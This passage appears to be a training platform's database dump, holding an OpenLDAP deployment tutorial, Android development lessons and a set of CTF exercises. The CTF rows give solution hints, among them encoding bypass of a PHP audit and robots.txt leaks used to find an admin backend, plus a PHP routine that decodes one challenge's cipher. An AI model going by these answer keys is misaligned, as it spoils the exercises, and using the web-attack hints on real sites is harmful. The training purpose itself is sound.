你的数据是不是需要在不同的平台上读取？<br>2 你的数据是不是很少发生更改，但是会被频繁的读取？<br>3 你的数据是否能存放于一个平面数据库中<br>如果都为是，那么恭喜，LDAP 将是你最好的选择。<br><br>================================================================================<br><br>可选成品<br><br>Netscap Directory Server<br>Sun ONE Directory Server<br>Microsoft Active Directory<br>OpenLDAP是唯一可以在多种平台上部署的<br><br>================================================================================<br><br>LDAP 命名惯例<br><br>LDAP的术语中，“命名惯例”（namingconvention）可以说是“数据库结构”（databasestructure）<br>的同义词 .LDAP树的每一个节点，都可以用它们的“识别名称”（ DistinguishedNames,DN ）来表示如：<br>某个人的识别名称可表示成”cn=blues,ou=teach,dc=shuangxing,dc=com”<br><br>dc :域组件(domain component)<br>ou :组织单元<br>cn :通用名(common name)<br><br>===================================================================================<br><br>LDAP 目录<br><br>目录由包含有描述性信息的各个条目（或称“记录”）组成，LDAP使用一种简单的、基于字符串的方法来表示目录<br>条目。像DNS的主机名那样，LDAP目录记录的标识名（Distinguished Name，简称DN）用来读取某个条目。<br><br>基本DN:它是LDAP目录树的“根”或最顶部. dc=mycompany,dc=com。这种格式将&nbsp;<br>DNS域名分成两个部分，但是更灵活且便于扩展。<br>组织单元:在基本 DN(根目录)的下面是容器或组织单元 Organization Unit，（简称OU）<br>用于对数据进行分组和分类。<br>记录项:在 LDAP 目录结构的OU下面是实际的记录项，也称条目（Entry），相当于目录<br>树中的\"树叶\"，或者相当于数据库表中的记录。目录中的所有记录项都有一个惟一的识别<br>名称，也就是所谓的 DN。<br><br>======================================================================================<br><br>记录项<br>每一个记录项的DN是由两个部分组成的：RDN和记录在LDAP目录中的位置。<br>例如，将公司员工信息作为一条记录，这里给出一个完整的DN cn=hulk, ou=teach,dc=shuangxing,dc=com<br>其中 cn=hulk是RDN，用于惟一标识或区别记录；后面的ou和dc值指向目录结构中记录的位置<br><br>对象类和模式<br>对于员工信息记录，还需定义更为详细的属性（字段），如头衔、电话和地址等。<br>对象类和模式像普通的数据库一样，存储数据需要定义表的结构，定义各个字段。对于目录数据来说，也需要定制目录<br>的对象类型。LDAP存储各种类型的数据对象，这些对象可以用属性来表示。<br>LDAP目录用对象类（objectClasses）的概念来定义运行哪一类的对象使用什么属性。在几乎所有的LDAP服务器<br>中，都要根据需要扩展基本的 LDAP 目录的功能，创建新的对象类或者扩展现存的对象类。<br>模式（Schema）是按照相似性进行分组的对象类集合。<br><br>LDAP 的另一个重要的组成部分就是 Schema，Schema 定义了 LDAP目录所应遵循的结构和规则，比如一个objectclass<br>会有哪些属性，这些属性又是什么结构等等<br><br>====================================================================<br><br>entry，entries	条目，LDAP数据库里基本的存储单元，一堆属性的集合<br>attributes	属性，每个属性有一个type类型，一个或多个values值<br>distinguished name DN，唯一的区分名<br><br>Schema	架构，规定数据库里能存什么，以及怎么存！<br>object classes: name/OID： 对象类,规定一个entry可以出现哪些attribute types 它是多个attribute types集合<br>attribute types: name/OID： 属性类型，规定每个属性怎么去描述，例如 身高 怎么表示<br><br><br>常用的属性：<br>dn 用来唯一的标识entry<br>cn entry全名<br>sn 用户的姓<br>givename<br>uid 登录名<br>c 两位国家代码<br>o Name of an organization 组织名，一般公司名<br>ou Name of an organizational unit 组织单元，部门名<br>mail Internet e-mail address&nbsp;<br>st	省<br>l	区<br>street	街道<br><br></dd><dt>配置文件</dt><dd><br>==================================================================<br><br>[root@station11 schema]#&nbsp;vim /etc/openldap/schema/core.schema<br><br>objectClasses: ( 2.5.6.6 NAME \'person\'&nbsp;<br>SUP top STRUCTURAL<br>MUST ( sn $ cn )<br>MAY ( userPassword $ telephoneNumber $&nbsp;<br>seeAlso $ description ) )<br>注解：<br><br>SUP top	继承top对象类，top最顶层的对象类<br>STRUCTURAL	主对象类<br>MUST	强制的属性 mandatory<br>MAY	可选的属性<br><br>==================================================================<br><br>[root@station11 schema]#&nbsp;vim /etc/openldap/schema/nis.schema<br><br>objectclass ( 1.3.6.1.1.1.2.0 NAME \'posixAccount\'<br>DESC \'Abstraction of an account with POSIX attributes\'<br>SUP top AUXILIARY<br>MUST ( cn $ uid $ uidNumber $ gidNumber $ homeDirectory )<br>MAY ( userPassword $ loginShell $ gecos $ description ) )<br><br>objectclass ( 1.3.6.1.1.1.2.1 NAME \'shadowAccount\'<br>DESC \'Additional attributes for shadow passwords\'<br>SUP top AUXILIARY<br>MUST uid<br>MAY ( userPassword $ shadowLastChange $ shadowMin $<br>shadowMax $ shadowWarning $ shadowInactive $<br>shadowExpire $ shadowFlag $ description ) )<br><br>objectclass ( 1.3.6.1.1.1.2.2 NAME \'posixGroup\'<br>DESC \'Abstraction of a group of accounts\'<br>SUP top STRUCTURAL<br>MUST ( cn $ gidNumber )<br>MAY ( userPassword $ memberUid $ description ) )<br><br>注意：在一个entry里有且只有一个主对象类STRUCTURAL(同一级别)，可以有多个辅助对象AUXILIARY<br><br>===================================================================<br><br>人 entry&nbsp;<br><br>dn: id=5108241982111111<br>objectclasses: 生活<br>objectclasses: 工作 STRUCTURAL&nbsp;<br>objectClasses: person STRUCTURAL<br>身高： 170<br>体重： 90kg<br>姓名： 张三<br>ID： 5108241982111111<br>homeDirectory: /home/tom<br>homeDirectory: /home/jack<br><br>dn: 5108444444444444<br>objectclasses: 生活<br>身高： 170<br>体重： 90kg<br>姓名： 张三<br>公司： xx<br>ID： 5108444444444444<br><br>===================================================================<br><br>dn: cn=tom,dc=tianyun,dc=com<br>cn: tom<br>cn: aaa tom<br>uid: 1000<br>home: /home/tom<br><br>dn: cn=tom,dc=uplooking,dc=com<br>cn: tom<br>uid: 1000<br>home: /home/tom<br><br>===================================================================<br><br>LDIF: A standard text-based format for describing directory entries&nbsp;<br>是一个标准的基于文本格式，用来描述entry<br><br>dn: uid=bjensen,ou=people,dc=example,dc=com	//最左边,RDN<br>objectclass: top<br>objectclass: person<br>objectclass: organizationalPerson<br>objectclass: inetOrgPerson<br>cn: Barbara Jensen<br>cn: Barb Jensen<br>sn: Jensen<br>uid: bjensen<br>mail: bjensen@example.com<br>telephoneNumber: +1 919 754 3700<br>postalAddress: Example, Inc.$123 Main<br>Street$Any Town, NC 12345$USA<br>title: Account Manager<br><br>==================================================</dd><dt>实验：部署LDAP服务</dt><p></p><dd><span>部署LDAP服务</span><br><br>==============================================================================<br><br><span>一、定义DIT,目录信息树<br></span><br><span>vim /etc/openldap/slapd.conf</span><br>1. suffix 后缀，建议使用公司DNS域名作为整个DIT的后缀<br><br><span>dc=tianyun,dc=com</span><br><br>==============================================================================<br><br><span>二、安装软件包<br></span><br><span>yum -y install openldap openldap-clients openldap-servers db4</span><br><br>==============================================================================<br><br><span>三、配置<br></span><br>[root@station11 ~]#<span>&nbsp;</span><span>cd /etc/openldap/</span><br>[root@station11 openldap]#<span>&nbsp;</span><span>ls</span><br>cacerts DB_CONFIG.example ldap.conf schema slapd.conf<br><br><span>slapd.conf	//ldap服务器配置文件<br>ldap.conf	//ldap客户端配置文件<br>schema/*	//schema文件 nis.schema, core.schema<br>DB_CONFIG.example	//后端模板数据文件<br>cacerts	//CA证书，实验LDAP安全</span><br><br><span>slappasswd -s tianyun &gt;&gt; slapd.conf</span>	//生成管理DN口令<br><br>[root@station11 openldap]#<span>&nbsp;</span><span>vim slapd.conf<br></span><br><span>include /etc/openldap/schema/core.schema<br>include /etc/openldap/schema/cosine.schema<br>include /etc/openldap/schema/inetorgperson.schema<br>include /etc/openldap/schema/nis.schema	//包含必需的schema<br>database bdb<br>suffix \"dc=tianyun,dc=com\"<br>rootdn \"cn=admin,dc=tianyun,dc=com\"<br>rootpw {SSHA}BwlCKPwAyGxBWiPNsEMi+62Mhi+OsFS2<br>directory /var/lib/ldap	//后端数据目录</span><br><br><span>service ldap start<br>chkconfig ldap on</span><br><br>[root@station11 ~]#<span>&nbsp;</span><span>ps aux |grep slapd</span><br>ldap 10617 0.8 6.8 422960 71156 ? Ssl 20:47 0:00 /usr/sbin/slapd -h ldap:/// -u ldap<br>root 10626 0.0 0.0 4264 700 pts/1 R+ 20:48 0:00 grep slapd<br><br>[root@station11 ~]#<span>&nbsp;</span><span>grep ldap /etc/services<span>&nbsp;</span><br></span><br><span>ldap 389/tcp<br>ldap 389/udp<br>ldaps 636/tcp # LDAP over SSL<br>ldaps 636/udp # LDAP over SSL</span><br><br>[root@station11 ~]#<span>&nbsp;</span><span>netstat -tnlp |grep :389</span><br>tcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 10617/slapd<span>&nbsp;</span><br><br>=====================================================================================================<br><br><span>四、利用openldap自带的迁移工具生成相应ldif文件(base.ldif,group.ldif,usre.ldif)<br></span><span><br>1. 生成基本目录树，并导入到ldap<br></span><br><span>cd /usr/share/openldap/migration/</span><br><span>vim migrate_common.ph<br></span><br><span>$DEFAULT_MAIL_DOMAIN = \"tianyun.com\";	//邮件域<br>$DEFAULT_BASE = \"dc=tianyun,dc=com\"; //基础DN<br>$EXTENDED_SCHEMA = 1;	//支持扩展Schema<br></span><br><span>./migrate_base.pl &gt;&gt; base.ldif</span><br><br><br><span>2. 生成用户和组的ldif文件，并导入到ldap<br></span><br><span>for i in $(seq 1 10); do useradd ldapuser$i; echo \"123\"|passwd ldapuser$i --stdin; done<br>grep \'^ldapuser\' /etc/passwd &gt; user<br>grep \'^ldapuser\' /etc/group &gt; group<br>./migrate_passwd.pl user &gt; user.ldif<br>./migrate_group.pl group &gt; group.ldif</span><br><br><span>ldapadd -x -D \"cn=admin,dc=tianyun,dc=com\" -W -f group.ldif<span>&nbsp;</span><br>ldapadd -x -D \"cn=admin,dc=tianyun,dc=com\" -W -f user.ldif<span>&nbsp;</span><br>ldapsearch -x</span><br><br>=================================================================================================<br><br><span>五、安装phpldapadmin<br></span><br><span>yum -y install httpd php php-ldap</span><br><br>==================================================================================================<br><br><span>六、客户端使用LDAP</span><br><br><span>1. 使用LDAP进行身份验证（系统）</span><br><br>yum -y install openldap-clients<br>setup<br><br><span>2. Apache使用LDAP认证<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>mkdir /var/www/html/download</span><br>[root@station40 ~]#<span>&nbsp;</span><span>cp install.log /var/www/html/download/</span><br><br><span>&lt;Directory \"/var/www/html/download\"&gt;<br>AuthName \"ldap auth test\"<br>AuthType basic<br>AuthBasicProvider ldap<br>AuthLDAPUrl \"ldap://192.168.0.2/dc=tianyun,dc=com\"<br>Require valid-user<br>&lt;/Directory&gt;</span><br><br>============================================================<br>============================================================<br><br><span>&lt;Directory \"/var/www/html/download\"&gt;	//之前手工建立口令文件<br>AuthType basic<br>AuthName \"ldap auth test\"<br>AuthUserFile /etc/httpd/.passwd<br>Require valid-user<br>&lt;/Directory&gt;</span><br><br>============================================================================================<br><br><span>LDAP客户端管理命令：<br></span><br><span>查询：</span><br><span>ldapsearch -x -h 192.168.0.243 -b \"dc=gaohong,dc=com\"</span><br>-h 指定主机<br>-b 指定Base DN<br>-x 使用简单认证<br><br><span>ldapsearch -x -D \"cn=admin,dc=gaohong,dc=com\" -W -h 192.168.0.243 -b \"dc=gaohong,dc=com\"</span><br>-D 指定DN<br>-W 输入密码<br><br><span>vim /etc/openldap/ldap.conf<br></span><br><span>BASE dc=gaohong, dc=com<br>URI ldap://192.168.0.243</span><br><span><br>ldapsearch -x<span>&nbsp;</span><br>ldapadd -x -D \"cn=admin,dc=gaohong,dc=com\" -W -f user.ldif</span></dd><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:30:34',1,NULL,'',0,''),(80,'CTF基础训练课程三','关于php代码审计的简单测试','<p>php代码审计二次编码即可绕过。需要查编码表</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf3:latest','2016-10-13 16:38:34',1,NULL,'<p>1</p>',1,'<p>1</p>'),(81,'CTF基础训练课程四','基础CTF训练','<p>元素审查即可得到flag</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf4:latest','2016-10-14 11:45:03',1,NULL,'<p>4</p>',1,''),(82,'CTF基础训练课程五','基础的CTF训练课程','<p>这个训练和http的头信息，Accept-Language有关系。将http头信息中的中文字符去掉即可。</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf5:latest','2016-10-14 11:48:57',1,NULL,'',1,''),(83,'CTF基础训练课程六','基础的CTF训练课程','<p>服务器的返回头信息中找flag</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf6:latest','2016-10-14 11:49:31',1,NULL,'',1,'<p>6</p>'),(84,'CTF基础训练课程七','基础的CTF训练课程','<p>关于跳转页面的问题，需要抓包拿到跳转页面然后找flag</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf7:latest','2016-10-14 11:49:54',1,NULL,'<p>7</p>',1,''),(85,'CTF基础训练课程八','CTF基础训练','<p>关于input元素长度，控制的问题，提交足够的长度即可得到flag</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf8:latest','2016-10-17 16:49:56',1,NULL,'<p>8</p>',1,'<p>8</p>'),(86,'CTF基础训练课程九','基础的CTF训练课程','<p>关于robots信息泄露，然后找后台</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf9:latest','2016-10-17 16:50:23',1,NULL,'<p>9</p>',1,'<p>9</p>'),(87,'CTF基础训练课程十','基础的CTF训练课程','<p>关于js码表的问题，控制台执行js即可</p><p><br></p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf10:latest','2016-10-17 17:39:35',1,NULL,'<p>10</p>',1,''),(88,'CTF基础训练课程十一','密码算法题解','<p>1</p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf11:latest','2016-10-20 14:18:22',1,NULL,'<pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">//解密算法如下\r\nfunction</span> <span class=\"hljs-title\">decode</span><span class=\"hljs-params\">()</span></span>{	\r\n	$cipher = <span class=\"hljs-string\">\'==jMgWTn7jUr4u3YgcUqzE2YjAUnuplWuDxL1IyMv5zs\'</span>;\r\n	$tmp = base64_decode(strrev(str_rot13($cipher)));  \r\n	<span class=\"hljs-keyword\">echo</span> $tmp;  \r\n	$b = <span class=\"hljs-string\">\'\'</span>;  \r\n	<span class=\"hljs-keyword\">for</span> ($i=<span class=\"hljs-number\">0</span>; $i &lt; strlen($tmp); $i++) {   \r\n	    $a = substr($tmp, $i, <span class=\"hljs-number\">1</span>);  \r\n	    $b = $b.chr(ord($a)<span class=\"hljs-number\">-1</span>);  \r\n	}  \r\n<span class=\"hljs-keyword\">echo</span> strrev($b);  \r\n}</code></pre><p><br></p>',1,''),(89,'CTF基础训练课程十二','基础的CTF训练课程','<p>关于md5碰撞的ctf训练</p>',5,'http://oda8mr8yr.bkt.clouddn.com/CTF.png','daocloud.io/catteam/ctf12:latest','2016-10-20 15:16:47',1,NULL,'<p>md5 碰撞</p>',1,''),(90,'移动安全基础课程训练二','移动安全基础课程训练开发篇','<p>&nbsp; Android开发二</p><p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n在之前已经搭建安卓开发环境，但我们是利用sample代码，接下来我们新建个空的工程然后写段helloworld程序。</p><p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n与第一课新建工程不同的地方，我们在创建工程时选择add no activity。</p><p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n新建后工程目录，缺少代码。</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:214.5pt;height:170.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"D{J@})7H{W8WP@B_]()T61W\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%932.1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>在上图第一个com.example.user.myapplication中添加java代码，对其点右键选择NEW-&gt;Java Class,在对话框中填写如下：</p><p><v:shape id=\"图片_x0020_3\" o:spid=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:210pt;height:170.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"H4J]V2)8(_P[GOF8]((JO[G\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%932.2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>因为这里是入口class,所以superclass和interface暂时不要填写，点OK。</p><p>4.&nbsp;\r\n工程目前没有layout文件，现在我们需要为刚activity类添加一个布局文件。对res点右键，NEW-&gt;XML-&gt;Layout XML File,如图：</p><p><v:shape id=\"图片_x0020_4\" o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:283.5pt;\r\n height:73.5pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"}W_LX~KF87FCZ1JLO$(XFM7\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%932.3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>Activity常用布局有LinearLayout,\r\nFrameLayout, AbsoluteLayout, RelativeLayout, TableLayout五大布局，这个可以根据界面实际合理使用。</p><p>这里我们使用LinearLayout.</p><p>在生成的xml布局文件中，我们添加一个用来显示helloworld字符的TextView控件。</p><pre><i>&lt;?</i><b>xml version=</b><b>\"1.0\" </b><b>encoding=</b><b>\"utf-8\"</b><i>?&gt;<br>\r\n</i>&lt;<b>LinearLayout </b><b>xmlns:</b><b>android</b><b>=</b><b>\"http://schemas.android.com/apk/res/android\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"match_parent\"</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp; &lt;<b>TextView<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:text=</b><b>\"helloworld\"</b>/&gt;<br>\r\n<br>\r\n&lt;/<b>LinearLayout</b>&gt;<o:p></o:p></pre><pre><!--[if !supportLists]-->5.&nbsp;&nbsp; <!--[endif]-->在helloactivity.class中填入如下代码：<o:p></o:p></pre><pre><b>这里解释下activity的生命周期，onCreate主要是创建时产生，所以这里需要使用实现onCreate的方法，注意加上@Override注解可以检查和源码中的onCreate接口实现对照。这里我们要绑定刚才的布局layout.xml文件，所以使用setContentView()方法。<o:p></o:p></b></pre><pre><!--[if !supportLists]-->7.&nbsp;&nbsp; <!--[endif]-->&lt;<b>manifest </b><b>xmlns:</b><b>android</b><b>=</b><b>\"http://schemas.android.com/apk/res/android\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>package=</b><b>\"com.example.user.myapplication\"</b>&gt;<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; &lt;<b>application<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:allowBackup=</b><b>\"true\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:icon=</b><b>\"@mipmap/ic_launcher\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:label=</b><b>\"@string/app_name\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:supportsRtl=</b><b>\"true\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:theme=</b><b>\"@style/AppTheme\"</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<b>activity </b><b>android</b><b>:name=</b><b>\".helloactivity\"</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<b>intent-filter </b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<b>action </b><b>android</b><b>:name=</b><b>\"android.intent.action.MAIN\" </b>/&gt;<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<b>category </b><b>android</b><b>:name=</b><b>\"android.intent.category.LAUNCHER\" </b>/&gt;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/<b>intent-filter</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/<b>activity</b>&gt;<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; &lt;/<b>application</b>&gt;<br>\r\n<br>\r\n&lt;/<b>manifest</b>&gt;<o:p></o:p></pre><pre>action<br>\r\n使用 android:name 特性来指定对响应的动作名。动作名必须是独一无二的字符串，所以，一个好的习惯是使用基于 Java&nbsp;包的命名方式的命名系统。<o:p></o:p></pre><pre><br>\r\n<br>\r\ncategory<o:p></o:p></pre><pre>CATEGORY_GADGET，表示目标Activity是可以嵌入到其他Activity中的。<br>\r\nCATEGORY_HOME，表明目标Activity为HOME Activity。<br>\r\nCATEGORY_TAB，表明目标Activity是TabActivity的一个标签下的Activity。<br>\r\nCATEGORY_LAUNCHER，表明目标Activity是应用程序中最先被执行的Activity。<br>\r\nCATEGORY_PREFERNCE，表明目标Activity是一个偏好设置的Activity。<o:p></o:p></pre><pre><o:p>&nbsp;</o:p></pre><pre>在application的节点下添加activity节点，并添加<a>intent-filter</a>属性设置为入口activity属性。</pre><pre>9.在工具栏的build选项中选择generate signed apk。</pre><pre><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%932.4.png\"><br></pre><pre>keytool -genkey -alias gavin -keypass 654321 -keyalg RSA -keysize 1024 -validity 365 -keystore e:\\key\\gavin.keystore -storepass 123456 -dname CN=abcd</pre><p></p><pre><span>keypass</span><span>是你自己的密码，不能被公布，<span>storepass</span>是公开的密码，<span>CN</span>是你的名字，默认输出到<span>E</span>盘的<span>key</span>文件夹下。<span><o:p></o:p></span></span></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%932.5.png\"><br></p><p><br></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:24:51',1,NULL,'<p>看课程报告</p>',0,''),(91,'移动安全基础课程训练三','移动安全基础课程训练开发篇','<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Android开发三</p><p>一．开发实战</p><p>这一节开始我们开发一个demo级别的app,来演示android基本的开发。</p><p>我们新建一个工程，取名为com.example.user.demo；</p><pre>在<a>activity_main.xml</a>创建一个LinearLayout布局，贴下这里的布局代码。<o:p></o:p></pre><p>&nbsp;</p><p>&nbsp;</p><pre><i>&lt;?</i><b>xml version=</b><b>\"1.0\" </b><b>encoding=</b><b>\"utf-8\"</b><i>?&gt;<br>\r\n</i>&lt;<b>LinearLayout </b><b>xmlns:</b><b>android</b><b>=</b><b>\"http://schemas.android.com/apk/res/android\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>xmlns:</b><b>tools</b><b>=</b><b>\"http://schemas.android.com/tools\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:id=</b><b>\"@+id/activity_main\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:orientation=</b><b>\"vertical\"<br>\r\n&nbsp;&nbsp;&nbsp; </b><b>tools</b><b>:context=</b><b>\"com.example.user.demo.MainActivity\"</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp; &lt;<b>LinearLayout<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:orientation=</b><b>\"horizontal\"</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<b>TextView<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:text=</b><b>\"</b><b>用户名\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_weight=</b><b>\"1\"</b>/&gt;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<b>EditText<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:id=</b><b>\"@+id/username\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_weight=</b><b>\"2\"</b>/&gt;<br>\r\n<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; &lt;/<b>LinearLayout</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp; &lt;<b>LinearLayout<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_width=</b><b>\"match_parent\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:layout_height=</b><b>\"wrap_content\"<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><b>android</b><b>:<a>orientation</a>=</b><b>\"horizontal\"</b>&gt;<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<b>TextView<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 